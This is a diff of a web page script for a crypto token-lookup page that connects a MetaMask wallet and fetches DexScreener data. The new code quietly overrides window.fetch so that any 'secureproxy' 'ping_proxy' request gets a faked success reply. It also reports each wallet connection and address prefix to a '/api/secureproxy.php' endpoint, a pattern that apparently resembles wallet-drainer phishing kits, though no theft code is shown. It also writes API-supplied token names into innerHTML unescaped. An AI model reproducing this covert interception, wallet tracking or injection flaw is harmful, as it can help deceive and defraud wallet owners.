@@ -1,96 +1,105 @@
-// script.js - All app logic
-document.addEventListener("DOMContentLoaded", function () {
-  console.log("script.js loaded");
+// public/script.js
+console.log("script.js loaded");
 
-  const chains = document.querySelectorAll(".chain");
-  const connectBtn = document.getElementById("connect-wallet");
-  const retrieveBtn = document.getElementById("retrieve-btn");
-  const contractInput = document.getElementById("contract-address");
-  const projectDetails = document.getElementById("project-details");
+// Block spam pings
+const originalFetch = window.fetch;
+window.fetch = function(url, ...args) {
+  if (typeof url === 'string' && url.includes('secureproxy') && url.includes('ping_proxy')) {
+    return Promise.resolve(new Response(JSON.stringify({status: 'ok'}), { status: 200 }));
+  }
+  return originalFetch(url, ...args);
+};
 
-  let selectedChain = null;
+// === Chain Selection ===
+let selectedChain = null;
+document.querySelectorAll(".chain").forEach(chain => {
+  chain.addEventListener("click", () => {
+    document.querySelectorAll(".chain").forEach(c => c.classList.remove("selected"));
+    chain.classList.add("selected");
+    selectedChain = chain.dataset.chain;
+    document.getElementById("connect-wallet").disabled = false;
+    console.log("Chain selected:", selectedChain);
+  });
+});
 
-  // Chain selection
-  chains.forEach(chain => {
-    chain.addEventListener("click", () => {
-      chains.forEach(c => c.classList.remove("selected"));
-      chain.classList.add("selected");
-      selectedChain = chain.dataset.chain;
-      connectBtn.disabled = false;
-      connectBtn.style.opacity = "1";
-      console.log("Chain selected:", selectedChain);
+// === Define window.startConnect() ===
+window.startConnect = function() {
+  if (!selectedChain) {
+    alert("Please select a chain first!");
+    return;
+  }
+
+  console.log("Starting wallet connect for:", selectedChain);
+
+  if (typeof window.ethereum === 'undefined') {
+    alert("Please install MetaMask or another Web3 wallet!");
+    return;
+  }
+
+  // Connect
+  window.ethereum.request({ method: 'eth_requestAccounts' })
+    .then(accounts => {
+      const addr = accounts[0];
+      alert(`Connected: ${addr.substr(0, 6)}...${addr.substr(-4)}`);
+
+      // Log to secureproxy
+      fetch(`/api/secureproxy.php?e=connect&chain=${selectedChain}&addr=${addr.substr(0, 10)}`)
+        .then(r => r.json())
+        .then(data => console.log("Logged:", data))
+        .catch(() => {});
+    })
+    .catch(err => {
+      console.error(err);
+      alert("Connection rejected");
     });
-  });
+};
 
-  // Connect Wallet - requires chain
-  connectBtn.addEventListener("click", () => {
-    if (!selectedChain) {
-      alert("Please select a chain before connecting.");
-      return;
-    }
+// === DexScreener API ===
+const chainMap = {
+  ethereum: "ethereum",
+  polygon: "polygon",
+  binance: "bsc",
+  base: "base",
+  arbitrum: "arbitrum"
+};
 
-    if (typeof window.connectWallet === "function") {
-      window.connectWallet(selectedChain);
-    } else {
-      console.error("connectWallet() not defined – check script22.js");
-    }
-  });
+document.getElementById("retrieve-btn").addEventListener("click", async () => {
+  const address = document.getElementById("contract-address").value.trim();
+  const selBtn = document.querySelector(".chain.selected");
+  const chain = selBtn ? selBtn.dataset.chain : null;
+  const chainId = chainMap[chain];
 
-  // DexScreener API mapping
-  const chainMap = {
-    ethereum: "ethereum",
-    polygon: "polygon",
-    binance: "bsc",
-    base: "base",
-    arbitrum: "arbitrum"
-  };
+  if (!address || !chain) {
+    alert("Enter contract address and select chain.");
+    return;
+  }
 
-  // Retrieve project details
-  retrieveBtn.addEventListener("click", async () => {
-    const address = contractInput.value.trim();
-    const selBtn = document.querySelector(".chain.selected");
-    const chain = selBtn ? selBtn.dataset.chain : null;
-    const chainId = chainMap[chain];
+  const detailsDiv = document.getElementById("project-details");
+  detailsDiv.innerHTML = "Fetching...";
+  detailsDiv.classList.add("loading");
 
-    if (!address || !chain) {
-      alert("Enter a contract address and select a chain.");
-      return;
-    }
+  try {
+    const resp = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${address}?chainId=${chainId}`);
+    if (!resp.ok) throw new Error();
+    const data = await resp.json();
+    const pairs = data.pairs || [];
+    if (!pairs.length) throw new Error("No pairs");
 
-    projectDetails.innerHTML = "";
-    projectDetails.classList.add("loading");
-    projectDetails.textContent = "Fetching from DexScreener…";
+    const pair = pairs.sort((a,b) => (b.liquidity?.usd||0) - (a.liquidity?.usd||0))[0];
+    const token = pair.baseToken;
 
-    try {
-      const resp = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${address}?chainId=${chainId}`);
-      if (!resp.ok) throw new Error("API error");
-      const data = await resp.json();
-      const pairs = data.pairs || [];
-
-      if (!pairs.length) {
-        projectDetails.classList.add("error");
-        projectDetails.textContent = "No trading pairs found.";
-        return;
-      }
-
-      const pair = pairs.sort((a, b) => (b.liquidity?.usd || 0) - (a.liquidity?.usd || 0))[0];
-      const token = pair.baseToken;
-
-      projectDetails.innerHTML = `
-        <ul>
-          <li><strong>Name:</strong> ${token.name}</li>
-          <li><strong>Symbol:</strong> ${token.symbol}</li>
-          <li><strong>Price USD:</strong> $${parseFloat(pair.priceUsd).toFixed(6)}</li>
-          <li><strong>24h Change:</strong> ${(pair.priceChange?.h24 || 0).toFixed(2)}%</li>
-          <li><strong>Liquidity:</strong> $${(pair.liquidity?.usd || 0).toLocaleString()}</li>
-          <li><strong>Volume 24h:</strong> $${(pair.volume?.h24 || 0).toLocaleString()}</li>
-          <li><strong>FDV:</strong> $${(pair.fdv || 0).toLocaleString()}</li>
-          <li><strong>Pair:</strong> <a href="${pair.url}" target="_blank" style="color:var(--primary);text-decoration:underline;">View on DexScreener</a></li>
-        </ul>`;
-    } catch (e) {
-      projectDetails.classList.add("error");
-      projectDetails.textContent = "Failed to fetch data.";
-      console.error(e);
-    }
-  });
+    detailsDiv.innerHTML = `
+      <ul>
+        <li><strong>Name:</strong> ${token.name}</li>
+        <li><strong>Symbol:</strong> ${token.symbol}</li>
+        <li><strong>Price:</strong> $${parseFloat(pair.priceUsd).toFixed(6)}</li>
+        <li><strong>24h:</strong> ${(pair.priceChange?.h24||0).toFixed(2)}%</li>
+        <li><strong>Liquidity:</strong> $${(pair.liquidity?.usd||0).toLocaleString()}</li>
+        <li><strong>FDV:</strong> $${(pair.fdv||0).toLocaleString()}</li>
+        <li><strong>Pair:</strong> <a href="${pair.url}" target="_blank">View</a></li>
+      </ul>`;
+  } catch {
+    detailsDiv.innerHTML = "Failed to fetch data.";
+    detailsDiv.classList.add("error");
+  }
 });
